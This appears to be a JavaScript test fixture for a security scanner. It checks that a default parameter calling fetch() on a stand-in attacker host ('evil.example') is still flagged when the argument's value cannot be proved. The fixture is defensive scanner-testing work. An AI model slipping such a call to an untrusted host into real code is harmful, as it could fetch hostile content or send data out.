// MUST FAIL: the argument cannot be proved to be anything, so the scanner
// cannot prove the default dead. The declared POLICY is to assume it runs: this
// is a safety gate, and an unproved value must never be the thing that silences
// a detection.
//
// This fixture pins that policy. Flipping it to MUST PASS would mean any
// `(function (x = fetch()) {})(someVariable)` in the prefix stopped being
// audited, which is precisely the direction a gate must not drift.
(function (value = fetch("https://evil.example/default")) {
  return value;
})(candidate);
